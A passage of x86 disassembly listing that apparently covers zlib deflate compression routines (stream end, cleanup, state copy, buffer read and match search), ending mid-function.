  4038d8:	83 7f 10 00          	cmpl   $0x0,0x10(%edi)
  4038dc:	75 35                	jne    0x403913
  4038de:	c7 46 28 ff ff ff ff 	movl   $0xffffffff,0x28(%esi)
  4038e5:	5d                   	pop    %ebp
  4038e6:	5b                   	pop    %ebx
  4038e7:	5f                   	pop    %edi
  4038e8:	33 c0                	xor    %eax,%eax
  4038ea:	5e                   	pop    %esi
  4038eb:	c3                   	ret
  4038ec:	83 7f 04 00          	cmpl   $0x0,0x4(%edi)
  4038f0:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  4038f4:	75 21                	jne    0x403917
  4038f6:	3b 5c 24 14          	cmp    0x14(%esp),%ebx
  4038fa:	7f 1b                	jg     0x403917
  4038fc:	83 fb 04             	cmp    $0x4,%ebx
  4038ff:	74 16                	je     0x403917
  403901:	a1 e4 ef 41 00       	mov    0x41efe4,%eax
  403906:	5d                   	pop    %ebp
  403907:	5b                   	pop    %ebx
  403908:	89 47 18             	mov    %eax,0x18(%edi)
  40390b:	5f                   	pop    %edi
  40390c:	b8 fb ff ff ff       	mov    $0xfffffffb,%eax
  403911:	5e                   	pop    %esi
  403912:	c3                   	ret
  403913:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  403917:	8b 46 04             	mov    0x4(%esi),%eax
  40391a:	3d 9a 02 00 00       	cmp    $0x29a,%eax
  40391f:	75 19                	jne    0x40393a
  403921:	83 7f 04 00          	cmpl   $0x0,0x4(%edi)
  403925:	74 19                	je     0x403940
  403927:	8b 0d e4 ef 41 00    	mov    0x41efe4,%ecx
  40392d:	5d                   	pop    %ebp
  40392e:	5b                   	pop    %ebx
  40392f:	89 4f 18             	mov    %ecx,0x18(%edi)
  403932:	5f                   	pop    %edi
  403933:	b8 fb ff ff ff       	mov    $0xfffffffb,%eax
  403938:	5e                   	pop    %esi
  403939:	c3                   	ret
  40393a:	83 7f 04 00          	cmpl   $0x0,0x4(%edi)
  40393e:	75 19                	jne    0x403959
  403940:	83 7e 74 00          	cmpl   $0x0,0x74(%esi)
  403944:	75 13                	jne    0x403959
  403946:	85 db                	test   %ebx,%ebx
  403948:	0f 84 9e 00 00 00    	je     0x4039ec
  40394e:	3d 9a 02 00 00       	cmp    $0x29a,%eax
  403953:	0f 84 93 00 00 00    	je     0x4039ec
  403959:	8b 86 84 00 00 00    	mov    0x84(%esi),%eax
  40395f:	8d 14 40             	lea    (%eax,%eax,2),%edx
  403962:	8b 04 95 b8 d2 41 00 	mov    0x41d2b8(,%edx,4),%eax
  403969:	53                   	push   %ebx
  40396a:	56                   	push   %esi
  40396b:	ff d0                	call   *%eax
  40396d:	83 c4 08             	add    $0x8,%esp
  403970:	83 f8 02             	cmp    $0x2,%eax
  403973:	74 05                	je     0x40397a
  403975:	83 f8 03             	cmp    $0x3,%eax
  403978:	75 07                	jne    0x403981
  40397a:	c7 46 04 9a 02 00 00 	movl   $0x29a,0x4(%esi)
  403981:	85 c0                	test   %eax,%eax
  403983:	0f 84 38 01 00 00    	je     0x403ac1
  403989:	83 f8 02             	cmp    $0x2,%eax
  40398c:	0f 84 2f 01 00 00    	je     0x403ac1
  403992:	3b c5                	cmp    %ebp,%eax
  403994:	75 56                	jne    0x4039ec
  403996:	3b dd                	cmp    %ebp,%ebx
  403998:	75 0b                	jne    0x4039a5
  40399a:	56                   	push   %esi
  40399b:	e8 c0 6e 00 00       	call   0x40a860
  4039a0:	83 c4 04             	add    $0x4,%esp
  4039a3:	eb 36                	jmp    0x4039db
  4039a5:	6a 00                	push   $0x0
  4039a7:	6a 00                	push   $0x0
  4039a9:	6a 00                	push   $0x0
  4039ab:	56                   	push   %esi
  4039ac:	e8 0f 6e 00 00       	call   0x40a7c0
  4039b1:	83 c4 10             	add    $0x10,%esp
  4039b4:	83 fb 03             	cmp    $0x3,%ebx
  4039b7:	75 22                	jne    0x4039db
  4039b9:	8b 4e 4c             	mov    0x4c(%esi),%ecx
  4039bc:	8b 56 44             	mov    0x44(%esi),%edx
  4039bf:	33 c0                	xor    %eax,%eax
  4039c1:	66 89 44 4a fe       	mov    %ax,-0x2(%edx,%ecx,2)
  4039c6:	8b 4e 4c             	mov    0x4c(%esi),%ecx
  4039c9:	8d 54 09 fe          	lea    -0x2(%ecx,%ecx,1),%edx
  4039cd:	52                   	push   %edx
  4039ce:	50                   	push   %eax
  4039cf:	8b 46 44             	mov    0x44(%esi),%eax
  4039d2:	50                   	push   %eax
  4039d3:	e8 58 80 00 00       	call   0x40ba30
  4039d8:	83 c4 0c             	add    $0xc,%esp
  4039db:	8b c7                	mov    %edi,%eax
  4039dd:	e8 de f8 ff ff       	call   0x4032c0
  4039e2:	83 7f 10 00          	cmpl   $0x0,0x10(%edi)
  4039e6:	0f 84 f2 fe ff ff    	je     0x4038de
  4039ec:	83 fb 04             	cmp    $0x4,%ebx
  4039ef:	0f 85 f0 fe ff ff    	jne    0x4038e5
  4039f5:	8b 46 18             	mov    0x18(%esi),%eax
  4039f8:	85 c0                	test   %eax,%eax
  4039fa:	7f 07                	jg     0x403a03
  4039fc:	8b c5                	mov    %ebp,%eax
  4039fe:	5d                   	pop    %ebp
  4039ff:	5b                   	pop    %ebx
  403a00:	5f                   	pop    %edi
  403a01:	5e                   	pop    %esi
  403a02:	c3                   	ret
  403a03:	83 f8 02             	cmp    $0x2,%eax
  403a06:	0f 85 81 00 00 00    	jne    0x403a8d
  403a0c:	8b 56 14             	mov    0x14(%esi),%edx
  403a0f:	8a 47 30             	mov    0x30(%edi),%al
  403a12:	8b 4e 08             	mov    0x8(%esi),%ecx
  403a15:	88 04 11             	mov    %al,(%ecx,%edx,1)
  403a18:	01 6e 14             	add    %ebp,0x14(%esi)
  403a1b:	0f b6 57 31          	movzbl 0x31(%edi),%edx
  403a1f:	8b 46 14             	mov    0x14(%esi),%eax
  403a22:	8b 4e 08             	mov    0x8(%esi),%ecx
  403a25:	88 14 08             	mov    %dl,(%eax,%ecx,1)
  403a28:	01 6e 14             	add    %ebp,0x14(%esi)
  403a2b:	0f b6 57 32          	movzbl 0x32(%edi),%edx
  403a2f:	8b 46 14             	mov    0x14(%esi),%eax
  403a32:	8b 4e 08             	mov    0x8(%esi),%ecx
  403a35:	88 14 08             	mov    %dl,(%eax,%ecx,1)
  403a38:	01 6e 14             	add    %ebp,0x14(%esi)
  403a3b:	0f b6 57 33          	movzbl 0x33(%edi),%edx
  403a3f:	8b 46 14             	mov    0x14(%esi),%eax
  403a42:	8b 4e 08             	mov    0x8(%esi),%ecx
  403a45:	88 14 08             	mov    %dl,(%eax,%ecx,1)
  403a48:	01 6e 14             	add    %ebp,0x14(%esi)
  403a4b:	0f b6 57 08          	movzbl 0x8(%edi),%edx
  403a4f:	8b 46 14             	mov    0x14(%esi),%eax
  403a52:	8b 4e 08             	mov    0x8(%esi),%ecx
  403a55:	88 14 08             	mov    %dl,(%eax,%ecx,1)
  403a58:	01 6e 14             	add    %ebp,0x14(%esi)
  403a5b:	0f b6 57 09          	movzbl 0x9(%edi),%edx
  403a5f:	8b 46 14             	mov    0x14(%esi),%eax
  403a62:	8b 4e 08             	mov    0x8(%esi),%ecx
  403a65:	88 14 08             	mov    %dl,(%eax,%ecx,1)
  403a68:	01 6e 14             	add    %ebp,0x14(%esi)
  403a6b:	0f b6 57 0a          	movzbl 0xa(%edi),%edx
  403a6f:	8b 46 14             	mov    0x14(%esi),%eax
  403a72:	8b 4e 08             	mov    0x8(%esi),%ecx
  403a75:	88 14 08             	mov    %dl,(%eax,%ecx,1)
  403a78:	01 6e 14             	add    %ebp,0x14(%esi)
  403a7b:	0f b6 57 0b          	movzbl 0xb(%edi),%edx
  403a7f:	8b 46 14             	mov    0x14(%esi),%eax
  403a82:	8b 4e 08             	mov    0x8(%esi),%ecx
  403a85:	88 14 08             	mov    %dl,(%eax,%ecx,1)
  403a88:	01 6e 14             	add    %ebp,0x14(%esi)
  403a8b:	eb 14                	jmp    0x403aa1
  403a8d:	0f b7 4f 32          	movzwl 0x32(%edi),%ecx
  403a91:	8b c6                	mov    %esi,%eax
  403a93:	e8 f8 f7 ff ff       	call   0x403290
  403a98:	0f b7 4f 30          	movzwl 0x30(%edi),%ecx
  403a9c:	e8 ef f7 ff ff       	call   0x403290
  403aa1:	8b c7                	mov    %edi,%eax
  403aa3:	e8 18 f8 ff ff       	call   0x4032c0
  403aa8:	8b 46 18             	mov    0x18(%esi),%eax
  403aab:	85 c0                	test   %eax,%eax
  403aad:	7e 05                	jle    0x403ab4
  403aaf:	f7 d8                	neg    %eax
  403ab1:	89 46 18             	mov    %eax,0x18(%esi)
  403ab4:	5d                   	pop    %ebp
  403ab5:	33 c0                	xor    %eax,%eax
  403ab7:	39 46 14             	cmp    %eax,0x14(%esi)
  403aba:	5b                   	pop    %ebx
  403abb:	5f                   	pop    %edi
  403abc:	0f 94 c0             	sete   %al
  403abf:	5e                   	pop    %esi
  403ac0:	c3                   	ret
  403ac1:	83 7f 10 00          	cmpl   $0x0,0x10(%edi)
  403ac5:	0f 85 1a fe ff ff    	jne    0x4038e5
  403acb:	5d                   	pop    %ebp
  403acc:	5b                   	pop    %ebx
  403acd:	5f                   	pop    %edi
  403ace:	c7 46 28 ff ff ff ff 	movl   $0xffffffff,0x28(%esi)
  403ad5:	33 c0                	xor    %eax,%eax
  403ad7:	5e                   	pop    %esi
  403ad8:	c3                   	ret
  403ad9:	a1 d8 ef 41 00       	mov    0x41efd8,%eax
  403ade:	89 47 18             	mov    %eax,0x18(%edi)
  403ae1:	5f                   	pop    %edi
  403ae2:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  403ae7:	5e                   	pop    %esi
  403ae8:	c3                   	ret
  403ae9:	cc                   	int3
  403aea:	cc                   	int3
  403aeb:	cc                   	int3
  403aec:	cc                   	int3
  403aed:	cc                   	int3
  403aee:	cc                   	int3
  403aef:	cc                   	int3
  403af0:	56                   	push   %esi
  403af1:	8b 74 24 08          	mov    0x8(%esp),%esi
  403af5:	85 f6                	test   %esi,%esi
  403af7:	0f 84 bc 00 00 00    	je     0x403bb9
  403afd:	8b 46 1c             	mov    0x1c(%esi),%eax
  403b00:	85 c0                	test   %eax,%eax
  403b02:	0f 84 b1 00 00 00    	je     0x403bb9
  403b08:	57                   	push   %edi
  403b09:	8b 78 04             	mov    0x4(%eax),%edi
  403b0c:	83 ff 2a             	cmp    $0x2a,%edi
  403b0f:	74 29                	je     0x403b3a
  403b11:	83 ff 45             	cmp    $0x45,%edi
  403b14:	74 24                	je     0x403b3a
  403b16:	83 ff 49             	cmp    $0x49,%edi
  403b19:	74 1f                	je     0x403b3a
  403b1b:	83 ff 5b             	cmp    $0x5b,%edi
  403b1e:	74 1a                	je     0x403b3a
  403b20:	83 ff 67             	cmp    $0x67,%edi
  403b23:	74 15                	je     0x403b3a
  403b25:	83 ff 71             	cmp    $0x71,%edi
  403b28:	74 10                	je     0x403b3a
  403b2a:	81 ff 9a 02 00 00    	cmp    $0x29a,%edi
  403b30:	74 08                	je     0x403b3a
  403b32:	5f                   	pop    %edi
  403b33:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  403b38:	5e                   	pop    %esi
  403b39:	c3                   	ret
  403b3a:	8b 40 08             	mov    0x8(%eax),%eax
  403b3d:	85 c0                	test   %eax,%eax
  403b3f:	74 0d                	je     0x403b4e
  403b41:	8b 4e 24             	mov    0x24(%esi),%ecx
  403b44:	50                   	push   %eax
  403b45:	8b 46 28             	mov    0x28(%esi),%eax
  403b48:	50                   	push   %eax
  403b49:	ff d1                	call   *%ecx
  403b4b:	83 c4 08             	add    $0x8,%esp
  403b4e:	8b 56 1c             	mov    0x1c(%esi),%edx
  403b51:	8b 42 44             	mov    0x44(%edx),%eax
  403b54:	85 c0                	test   %eax,%eax
  403b56:	74 0d                	je     0x403b65
  403b58:	8b 4e 24             	mov    0x24(%esi),%ecx
  403b5b:	50                   	push   %eax
  403b5c:	8b 46 28             	mov    0x28(%esi),%eax
  403b5f:	50                   	push   %eax
  403b60:	ff d1                	call   *%ecx
  403b62:	83 c4 08             	add    $0x8,%esp
  403b65:	8b 56 1c             	mov    0x1c(%esi),%edx
  403b68:	8b 42 40             	mov    0x40(%edx),%eax
  403b6b:	85 c0                	test   %eax,%eax
  403b6d:	74 0d                	je     0x403b7c
  403b6f:	8b 4e 24             	mov    0x24(%esi),%ecx
  403b72:	50                   	push   %eax
  403b73:	8b 46 28             	mov    0x28(%esi),%eax
  403b76:	50                   	push   %eax
  403b77:	ff d1                	call   *%ecx
  403b79:	83 c4 08             	add    $0x8,%esp
  403b7c:	8b 56 1c             	mov    0x1c(%esi),%edx
  403b7f:	8b 42 38             	mov    0x38(%edx),%eax
  403b82:	85 c0                	test   %eax,%eax
  403b84:	74 0d                	je     0x403b93
  403b86:	8b 4e 24             	mov    0x24(%esi),%ecx
  403b89:	50                   	push   %eax
  403b8a:	8b 46 28             	mov    0x28(%esi),%eax
  403b8d:	50                   	push   %eax
  403b8e:	ff d1                	call   *%ecx
  403b90:	83 c4 08             	add    $0x8,%esp
  403b93:	8b 56 1c             	mov    0x1c(%esi),%edx
  403b96:	8b 46 28             	mov    0x28(%esi),%eax
  403b99:	8b 4e 24             	mov    0x24(%esi),%ecx
  403b9c:	52                   	push   %edx
  403b9d:	50                   	push   %eax
  403b9e:	ff d1                	call   *%ecx
  403ba0:	83 c4 08             	add    $0x8,%esp
  403ba3:	33 c0                	xor    %eax,%eax
  403ba5:	83 ff 71             	cmp    $0x71,%edi
  403ba8:	0f 95 c0             	setne  %al
  403bab:	5f                   	pop    %edi
  403bac:	c7 46 1c 00 00 00 00 	movl   $0x0,0x1c(%esi)
  403bb3:	5e                   	pop    %esi
  403bb4:	48                   	dec    %eax
  403bb5:	83 e0 fd             	and    $0xfffffffd,%eax
  403bb8:	c3                   	ret
  403bb9:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  403bbe:	5e                   	pop    %esi
  403bbf:	c3                   	ret
  403bc0:	53                   	push   %ebx
  403bc1:	55                   	push   %ebp
  403bc2:	56                   	push   %esi
  403bc3:	8b 74 24 14          	mov    0x14(%esp),%esi
  403bc7:	85 f6                	test   %esi,%esi
  403bc9:	0f 84 7a 01 00 00    	je     0x403d49
  403bcf:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  403bd3:	85 db                	test   %ebx,%ebx
  403bd5:	0f 84 6e 01 00 00    	je     0x403d49
  403bdb:	8b 6e 1c             	mov    0x1c(%esi),%ebp
  403bde:	85 ed                	test   %ebp,%ebp
  403be0:	0f 84 63 01 00 00    	je     0x403d49
  403be6:	57                   	push   %edi
  403be7:	b9 0e 00 00 00       	mov    $0xe,%ecx
  403bec:	8b fb                	mov    %ebx,%edi
  403bee:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403bf0:	8b 43 28             	mov    0x28(%ebx),%eax
  403bf3:	8b 4b 20             	mov    0x20(%ebx),%ecx
  403bf6:	68 c0 16 00 00       	push   $0x16c0
  403bfb:	6a 01                	push   $0x1
  403bfd:	50                   	push   %eax
  403bfe:	ff d1                	call   *%ecx
  403c00:	8b f0                	mov    %eax,%esi
  403c02:	83 c4 0c             	add    $0xc,%esp
  403c05:	85 f6                	test   %esi,%esi
  403c07:	0f 84 32 01 00 00    	je     0x403d3f
  403c0d:	68 c0 16 00 00       	push   $0x16c0
  403c12:	55                   	push   %ebp
  403c13:	56                   	push   %esi
  403c14:	89 73 1c             	mov    %esi,0x1c(%ebx)
  403c17:	e8 34 77 00 00       	call   0x40b350
  403c1c:	8b 56 2c             	mov    0x2c(%esi),%edx
  403c1f:	89 1e                	mov    %ebx,(%esi)
  403c21:	8b 43 28             	mov    0x28(%ebx),%eax
  403c24:	8b 4b 20             	mov    0x20(%ebx),%ecx
  403c27:	6a 02                	push   $0x2
  403c29:	52                   	push   %edx
  403c2a:	50                   	push   %eax
  403c2b:	ff d1                	call   *%ecx
  403c2d:	8b 56 2c             	mov    0x2c(%esi),%edx
  403c30:	89 46 38             	mov    %eax,0x38(%esi)
  403c33:	8b 43 28             	mov    0x28(%ebx),%eax
  403c36:	8b 4b 20             	mov    0x20(%ebx),%ecx
  403c39:	6a 02                	push   $0x2
  403c3b:	52                   	push   %edx
  403c3c:	50                   	push   %eax
  403c3d:	ff d1                	call   *%ecx
  403c3f:	8b 56 4c             	mov    0x4c(%esi),%edx
  403c42:	89 46 40             	mov    %eax,0x40(%esi)
  403c45:	8b 43 28             	mov    0x28(%ebx),%eax
  403c48:	8b 4b 20             	mov    0x20(%ebx),%ecx
  403c4b:	6a 02                	push   $0x2
  403c4d:	52                   	push   %edx
  403c4e:	50                   	push   %eax
  403c4f:	ff d1                	call   *%ecx
  403c51:	8b 96 9c 16 00 00    	mov    0x169c(%esi),%edx
  403c57:	89 46 44             	mov    %eax,0x44(%esi)
  403c5a:	8b 43 28             	mov    0x28(%ebx),%eax
  403c5d:	8b 4b 20             	mov    0x20(%ebx),%ecx
  403c60:	6a 04                	push   $0x4
  403c62:	52                   	push   %edx
  403c63:	50                   	push   %eax
  403c64:	ff d1                	call   *%ecx
  403c66:	8b f8                	mov    %eax,%edi
  403c68:	8b 46 38             	mov    0x38(%esi),%eax
  403c6b:	83 c4 3c             	add    $0x3c,%esp
  403c6e:	89 7e 08             	mov    %edi,0x8(%esi)
  403c71:	85 c0                	test   %eax,%eax
  403c73:	0f 84 bd 00 00 00    	je     0x403d36
  403c79:	83 7e 40 00          	cmpl   $0x0,0x40(%esi)
  403c7d:	0f 84 b3 00 00 00    	je     0x403d36
  403c83:	83 7e 44 00          	cmpl   $0x0,0x44(%esi)
  403c87:	0f 84 a9 00 00 00    	je     0x403d36
  403c8d:	85 ff                	test   %edi,%edi
  403c8f:	0f 84 a1 00 00 00    	je     0x403d36
  403c95:	8b 56 2c             	mov    0x2c(%esi),%edx
  403c98:	8b 4d 38             	mov    0x38(%ebp),%ecx
  403c9b:	03 d2                	add    %edx,%edx
  403c9d:	52                   	push   %edx
  403c9e:	51                   	push   %ecx
  403c9f:	50                   	push   %eax
  403ca0:	e8 ab 76 00 00       	call   0x40b350
  403ca5:	8b 56 2c             	mov    0x2c(%esi),%edx
  403ca8:	8b 45 40             	mov    0x40(%ebp),%eax
  403cab:	8b 4e 40             	mov    0x40(%esi),%ecx
  403cae:	03 d2                	add    %edx,%edx
  403cb0:	52                   	push   %edx
  403cb1:	50                   	push   %eax
  403cb2:	51                   	push   %ecx
  403cb3:	e8 98 76 00 00       	call   0x40b350
  403cb8:	8b 56 4c             	mov    0x4c(%esi),%edx
  403cbb:	8b 45 44             	mov    0x44(%ebp),%eax
  403cbe:	8b 4e 44             	mov    0x44(%esi),%ecx
  403cc1:	03 d2                	add    %edx,%edx
  403cc3:	52                   	push   %edx
  403cc4:	50                   	push   %eax
  403cc5:	51                   	push   %ecx
  403cc6:	e8 85 76 00 00       	call   0x40b350
  403ccb:	8b 56 0c             	mov    0xc(%esi),%edx
  403cce:	8b 45 08             	mov    0x8(%ebp),%eax
  403cd1:	8b 4e 08             	mov    0x8(%esi),%ecx
  403cd4:	52                   	push   %edx
  403cd5:	50                   	push   %eax
  403cd6:	51                   	push   %ecx
  403cd7:	e8 74 76 00 00       	call   0x40b350
  403cdc:	8b 55 10             	mov    0x10(%ebp),%edx
  403cdf:	2b 55 08             	sub    0x8(%ebp),%edx
  403ce2:	8b 4e 08             	mov    0x8(%esi),%ecx
  403ce5:	8b 86 9c 16 00 00    	mov    0x169c(%esi),%eax
  403ceb:	03 d1                	add    %ecx,%edx
  403ced:	89 56 10             	mov    %edx,0x10(%esi)
  403cf0:	8b d0                	mov    %eax,%edx
  403cf2:	8d 0c 41             	lea    (%ecx,%eax,2),%ecx
  403cf5:	d1 ea                	shr    $1,%edx
  403cf7:	03 c8                	add    %eax,%ecx
  403cf9:	83 c4 30             	add    $0x30,%esp
  403cfc:	8d 14 57             	lea    (%edi,%edx,2),%edx
  403cff:	89 96 a4 16 00 00    	mov    %edx,0x16a4(%esi)
  403d05:	89 8e 98 16 00 00    	mov    %ecx,0x1698(%esi)
  403d0b:	8d 86 88 09 00 00    	lea    0x988(%esi),%eax
  403d11:	8d 96 94 00 00 00    	lea    0x94(%esi),%edx
  403d17:	8d 8e 7c 0a 00 00    	lea    0xa7c(%esi),%ecx
  403d1d:	5f                   	pop    %edi
  403d1e:	89 86 24 0b 00 00    	mov    %eax,0xb24(%esi)
  403d24:	89 96 18 0b 00 00    	mov    %edx,0xb18(%esi)
  403d2a:	89 8e 30 0b 00 00    	mov    %ecx,0xb30(%esi)
  403d30:	5e                   	pop    %esi
  403d31:	5d                   	pop    %ebp
  403d32:	33 c0                	xor    %eax,%eax
  403d34:	5b                   	pop    %ebx
  403d35:	c3                   	ret
  403d36:	53                   	push   %ebx
  403d37:	e8 b4 fd ff ff       	call   0x403af0
  403d3c:	83 c4 04             	add    $0x4,%esp
  403d3f:	5f                   	pop    %edi
  403d40:	5e                   	pop    %esi
  403d41:	5d                   	pop    %ebp
  403d42:	b8 fc ff ff ff       	mov    $0xfffffffc,%eax
  403d47:	5b                   	pop    %ebx
  403d48:	c3                   	ret
  403d49:	5e                   	pop    %esi
  403d4a:	5d                   	pop    %ebp
  403d4b:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  403d50:	5b                   	pop    %ebx
  403d51:	c3                   	ret
  403d52:	cc                   	int3
  403d53:	cc                   	int3
  403d54:	cc                   	int3
  403d55:	cc                   	int3
  403d56:	cc                   	int3
  403d57:	cc                   	int3
  403d58:	cc                   	int3
  403d59:	cc                   	int3
  403d5a:	cc                   	int3
  403d5b:	cc                   	int3
  403d5c:	cc                   	int3
  403d5d:	cc                   	int3
  403d5e:	cc                   	int3
  403d5f:	cc                   	int3
  403d60:	8b 46 04             	mov    0x4(%esi),%eax
  403d63:	57                   	push   %edi
  403d64:	8b f8                	mov    %eax,%edi
  403d66:	3b f9                	cmp    %ecx,%edi
  403d68:	76 02                	jbe    0x403d6c
  403d6a:	8b f9                	mov    %ecx,%edi
  403d6c:	85 ff                	test   %edi,%edi
  403d6e:	75 04                	jne    0x403d74
  403d70:	33 c0                	xor    %eax,%eax
  403d72:	5f                   	pop    %edi
  403d73:	c3                   	ret
  403d74:	2b c7                	sub    %edi,%eax
  403d76:	89 46 04             	mov    %eax,0x4(%esi)
  403d79:	8b 46 1c             	mov    0x1c(%esi),%eax
  403d7c:	8b 40 18             	mov    0x18(%eax),%eax
  403d7f:	83 f8 01             	cmp    $0x1,%eax
  403d82:	75 0f                	jne    0x403d93
  403d84:	8b 0e                	mov    (%esi),%ecx
  403d86:	8b 56 30             	mov    0x30(%esi),%edx
  403d89:	57                   	push   %edi
  403d8a:	51                   	push   %ecx
  403d8b:	52                   	push   %edx
  403d8c:	e8 0f e7 ff ff       	call   0x4024a0
  403d91:	eb 12                	jmp    0x403da5
  403d93:	83 f8 02             	cmp    $0x2,%eax
  403d96:	75 13                	jne    0x403dab
  403d98:	8b 06                	mov    (%esi),%eax
  403d9a:	8b 4e 30             	mov    0x30(%esi),%ecx
  403d9d:	57                   	push   %edi
  403d9e:	50                   	push   %eax
  403d9f:	51                   	push   %ecx
  403da0:	e8 db f2 ff ff       	call   0x403080
  403da5:	89 46 30             	mov    %eax,0x30(%esi)
  403da8:	83 c4 0c             	add    $0xc,%esp
  403dab:	8b 16                	mov    (%esi),%edx
  403dad:	8b 44 24 08          	mov    0x8(%esp),%eax
  403db1:	57                   	push   %edi
  403db2:	52                   	push   %edx
  403db3:	50                   	push   %eax
  403db4:	e8 97 75 00 00       	call   0x40b350
  403db9:	01 3e                	add    %edi,(%esi)
  403dbb:	01 7e 08             	add    %edi,0x8(%esi)
  403dbe:	83 c4 0c             	add    $0xc,%esp
  403dc1:	8b c7                	mov    %edi,%eax
  403dc3:	5f                   	pop    %edi
  403dc4:	c3                   	ret
  403dc5:	cc                   	int3
  403dc6:	cc                   	int3
  403dc7:	cc                   	int3
  403dc8:	cc                   	int3
  403dc9:	cc                   	int3
  403dca:	cc                   	int3
  403dcb:	cc                   	int3
  403dcc:	cc                   	int3
  403dcd:	cc                   	int3
  403dce:	cc                   	int3
  403dcf:	cc                   	int3
  403dd0:	8b 46 2c             	mov    0x2c(%esi),%eax
  403dd3:	8b 4e 4c             	mov    0x4c(%esi),%ecx
  403dd6:	8b 56 44             	mov    0x44(%esi),%edx
  403dd9:	03 c0                	add    %eax,%eax
  403ddb:	89 46 3c             	mov    %eax,0x3c(%esi)
  403dde:	33 c0                	xor    %eax,%eax
  403de0:	66 89 44 4a fe       	mov    %ax,-0x2(%edx,%ecx,2)
  403de5:	8b 4e 4c             	mov    0x4c(%esi),%ecx
  403de8:	8b 46 44             	mov    0x44(%esi),%eax
  403deb:	57                   	push   %edi
  403dec:	8d 54 09 fe          	lea    -0x2(%ecx,%ecx,1),%edx
  403df0:	52                   	push   %edx
  403df1:	33 ff                	xor    %edi,%edi
  403df3:	57                   	push   %edi
  403df4:	50                   	push   %eax
  403df5:	e8 36 7c 00 00       	call   0x40ba30
  403dfa:	8b 86 84 00 00 00    	mov    0x84(%esi),%eax
  403e00:	8d 04 40             	lea    (%eax,%eax,2),%eax
  403e03:	03 c0                	add    %eax,%eax
  403e05:	0f b7 8c 00 b2 d2 41 	movzwl 0x41d2b2(%eax,%eax,1),%ecx
  403e0c:	00 
  403e0d:	03 c0                	add    %eax,%eax
  403e0f:	89 8e 80 00 00 00    	mov    %ecx,0x80(%esi)
  403e15:	0f b7 90 b0 d2 41 00 	movzwl 0x41d2b0(%eax),%edx
  403e1c:	89 96 8c 00 00 00    	mov    %edx,0x8c(%esi)
  403e22:	0f b7 88 b4 d2 41 00 	movzwl 0x41d2b4(%eax),%ecx
  403e29:	89 8e 90 00 00 00    	mov    %ecx,0x90(%esi)
  403e2f:	0f b7 90 b6 d2 41 00 	movzwl 0x41d2b6(%eax),%edx
  403e36:	b8 02 00 00 00       	mov    $0x2,%eax
  403e3b:	83 c4 0c             	add    $0xc,%esp
  403e3e:	89 7e 6c             	mov    %edi,0x6c(%esi)
  403e41:	89 7e 5c             	mov    %edi,0x5c(%esi)
  403e44:	89 7e 74             	mov    %edi,0x74(%esi)
  403e47:	89 7e 68             	mov    %edi,0x68(%esi)
  403e4a:	89 7e 48             	mov    %edi,0x48(%esi)
  403e4d:	89 56 7c             	mov    %edx,0x7c(%esi)
  403e50:	89 46 78             	mov    %eax,0x78(%esi)
  403e53:	89 46 60             	mov    %eax,0x60(%esi)
  403e56:	5f                   	pop    %edi
  403e57:	c3                   	ret
  403e58:	cc                   	int3
  403e59:	cc                   	int3
  403e5a:	cc                   	int3
  403e5b:	cc                   	int3
  403e5c:	cc                   	int3
  403e5d:	cc                   	int3
  403e5e:	cc                   	int3
  403e5f:	cc                   	int3
  403e60:	83 ec 14             	sub    $0x14,%esp
  403e63:	8b 4f 7c             	mov    0x7c(%edi),%ecx
  403e66:	8b 57 6c             	mov    0x6c(%edi),%edx
  403e69:	53                   	push   %ebx
  403e6a:	55                   	push   %ebp
  403e6b:	8b 6f 78             	mov    0x78(%edi),%ebp
  403e6e:	56                   	push   %esi
  403e6f:	8b b7 90 00 00 00    	mov    0x90(%edi),%esi
  403e75:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  403e79:	8b 4f 38             	mov    0x38(%edi),%ecx
  403e7c:	89 74 24 14          	mov    %esi,0x14(%esp)
  403e80:	8b 77 2c             	mov    0x2c(%edi),%esi
  403e83:	8d 9e fa fe ff ff    	lea    -0x106(%esi),%ebx
  403e89:	03 ca                	add    %edx,%ecx
  403e8b:	3b d3                	cmp    %ebx,%edx
  403e8d:	76 0e                	jbe    0x403e9d
  403e8f:	2b d6                	sub    %esi,%edx
  403e91:	81 c2 06 01 00 00    	add    $0x106,%edx
  403e97:	89 54 24 18          	mov    %edx,0x18(%esp)
  403e9b:	eb 08                	jmp    0x403ea5
  403e9d:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  403ea4:	00 
  403ea5:	0f b6 54 29 ff       	movzbl -0x1(%ecx,%ebp,1),%edx
  403eaa:	88 54 24 0e          	mov    %dl,0xe(%esp)
  403eae:	0f b6 14 29          	movzbl (%ecx,%ebp,1),%edx
  403eb2:	8d b1 02 01 00 00    	lea    0x102(%ecx),%esi
  403eb8:	88 54 24 0f          	mov    %dl,0xf(%esp)
  403ebc:	3b af 8c 00 00 00    	cmp    0x8c(%edi),%ebp
  403ec2:	72 05                	jb     0x403ec9
  403ec4:	c1 6c 24 10 02       	shrl   $0x2,0x10(%esp)
  403ec9:	8b 57 74             	mov    0x74(%edi),%edx
  403ecc:	39 54 24 14          	cmp    %edx,0x14(%esp)
  403ed0:	76 04                	jbe    0x403ed6
  403ed2:	89 54 24 14          	mov    %edx,0x14(%esp)
  403ed6:	8b 57 38             	mov    0x38(%edi),%edx
  403ed9:	8a 5c 24 0f          	mov    0xf(%esp),%bl
  403edd:	03 d0                	add    %eax,%edx
  403edf:	38 1c 2a             	cmp    %bl,(%edx,%ebp,1)
  403ee2:	0f 85 a3 00 00 00    	jne    0x403f8b
  403ee8:	8a 5c 24 0e          	mov    0xe(%esp),%bl
  403eec:	38 5c 2a ff          	cmp    %bl,-0x1(%edx,%ebp,1)
  403ef0:	0f 85 95 00 00 00    	jne    0x403f8b
  403ef6:	8a 1a                	mov    (%edx),%bl
  403ef8:	3a 19                	cmp    (%ecx),%bl
  403efa:	0f 85 8b 00 00 00    	jne    0x403f8b
  403f00:	8a 5a 01             	mov    0x1(%edx),%bl
  403f03:	42                   	inc    %edx
  403f04:	3a 59 01             	cmp    0x1(%ecx),%bl
  403f07:	0f 85 7e 00 00 00    	jne    0x403f8b
  403f0d:	83 c1 02             	add    $0x2,%ecx
